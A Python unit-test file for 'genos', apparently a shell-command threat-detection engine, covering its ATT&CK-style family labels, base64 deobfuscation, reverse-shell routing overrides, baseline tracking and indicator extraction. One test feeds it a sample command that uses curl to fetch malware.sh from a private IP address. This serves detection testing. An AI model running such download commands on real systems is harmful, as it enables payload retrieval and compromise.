import sys
import unittest
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import Mock, patch

import torch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "parser"))

from genos.baseline import (
    BaselineMode,
    BaselineStatus,
    BaselineStore,
    ExecutionContext,
    SignatureExtractor,
)
from genos.deobfuscator import Deobfuscator, is_obfuscated, deobfuscate, decode_bare_base64
from genos.gatekeeper import Gatekeeper, extract_routing_features, SUSPICIOUS_ROUTING_FEATURES
from genos.specialist import Specialist, FAMILY_LABELS
from genos.evidence import build_evidence, generate_evidence_summary, collect_indicator_evidence
from genos.engine import GenosEngine
from parser import parse_command


def _test_ctx(host_id="host-1", role="ops", timestamp=None, parent_process="powershell.exe"):
    if timestamp is None:
        timestamp = datetime(2026, 10, 9, 12, 0, tzinfo=timezone.utc)
    return ExecutionContext(
        host_id=host_id,
        parent_process=parent_process,
        user="svc",
        timestamp=timestamp,
        role=role,
        fleet="fleet-a",
        in_maintenance_window=False,
    )


class EngineRefactorTests(unittest.TestCase):
    def test_specialist_11_families_declared(self):
        """Verify the 11 MITRE ATT&CK tactic heads/families."""
        expected = [
            "Execution",
            "Persistence",
            "Privilege Escalation",
            "Defense Evasion",
            "Credential Access",
            "Discovery",
            "Lateral Movement",
            "Command-and-Control / Payload Retrieval",
            "Exfiltration",
            "Impact",
            "Benign Admin",
        ]
        self.assertEqual(len(FAMILY_LABELS), 11)
        self.assertEqual(FAMILY_LABELS, expected)

    def test_deobfuscator_standalone_functions(self):
        """Verify deobfuscator unrolls encoded payloads."""
        self.assertEqual(decode_bare_base64("d2hvYW1p"), "whoami")
        self.assertTrue(is_obfuscated("d2hvYW1p"))
        self.assertEqual(deobfuscate("d2hvYW1p"), "whoami")
        self.assertFalse(is_obfuscated("ls -la /tmp"))

    def test_routing_flags_affect_label_and_specialist_flag(self):
        """Verify high-risk features force Suspicious verdict and trigger specialist."""
        gk = Gatekeeper(backend="codebert", two_class=True)
        
        # Simulated benign model output (p(benign) = 0.95)
        benign_summary = {
            "label": "Benign",
            "public_label": "Benign",
            "benign_prob": 0.95,
            "suspicious_prob": 0.05,
            "class_probabilities": {"Benign": 0.95, "Suspicious": 0.05},
        }

        # 1. Clean command -> Benign, should_run_specialist = False
        clean_features = {k: False for k in SUSPICIOUS_ROUTING_FEATURES}
        route_clean = gk.route(benign_summary, clean_features)
        self.assertEqual(route_clean["label"], "Benign")
        self.assertFalse(route_clean["should_run_specialist"])
        self.assertEqual(route_clean["routing_policy"], "model_top_class")

        # 2. Reverse shell feature triggered -> Overrides to Suspicious, should_run_specialist = True
        suspicious_features = dict(clean_features)
        suspicious_features["has_reverse_shell_pattern"] = True
        route_suspicious = gk.route(benign_summary, suspicious_features)
        self.assertEqual(route_suspicious["label"], "Suspicious")
        self.assertTrue(route_suspicious["should_run_specialist"])
        self.assertEqual(route_suspicious["routing_policy"], "feature_override")
        self.assertEqual(route_suspicious["confidence_driver"], "feature_override")

    def test_short_circuit_write_back_increments_seen_count(self):
        """Verify repeat sightings on KNOWN_STABLE hit update the baseline store."""
        store = BaselineStore(mode=BaselineMode.ENFORCE, min_sightings=1, min_distinct_days=1)
        sig = SignatureExtractor.extract(parse_command("whoami"))
        ctx = _test_ctx(host_id="host-writeback")

        # Initial sighting admitted
        store.observe_and_admit(
            sig,
            ctx,
            {"class_probabilities": {"Malicious": 1.0, "Context_Dependent": 2.0, "Benign": 97.0}},
        )

        # Baseline evaluation confirms KNOWN_STABLE
        eval_before = store.evaluate(sig, ctx)
        self.assertEqual(eval_before.status, BaselineStatus.KNOWN_STABLE)
        self.assertFalse(eval_before.should_run_genos)
        initial_seen = eval_before.seen_count

        # Execute engine scan with baseline store
        engine = GenosEngine.__new__(GenosEngine)
        engine.provenance = {}
        engine.baseline_store = store
        engine.deobfuscator = Deobfuscator()

        res = engine.scan("whoami", context=ctx, baseline_store=store)
        self.assertEqual(res["baseline_status"], BaselineStatus.KNOWN_STABLE.value)

        # Confirm repeat sighting incremented seen_count in store
        eval_after = store.evaluate(sig, ctx)
        self.assertEqual(eval_after.seen_count, initial_seen + 1)

    def test_evidence_extraction_and_summary(self):
        """Verify evidence.py builds IOCs and summary."""
        parsed = parse_command("curl -s http://192.168.1.100/malware.sh -o /tmp/malware.sh")
        evidence = collect_indicator_evidence("curl -s http://192.168.1.100/malware.sh -o /tmp/malware.sh", "curl -s http://192.168.1.100/malware.sh -o /tmp/malware.sh")
        self.assertIn("192.168.1.100", evidence["ips"])
        self.assertTrue(any("malware.sh" in f for f in evidence["file_paths"]))
        self.assertEqual(evidence["executable"], "curl")
        self.assertIsNotNone(evidence["evidence_summary"])


if __name__ == "__main__":
    unittest.main()
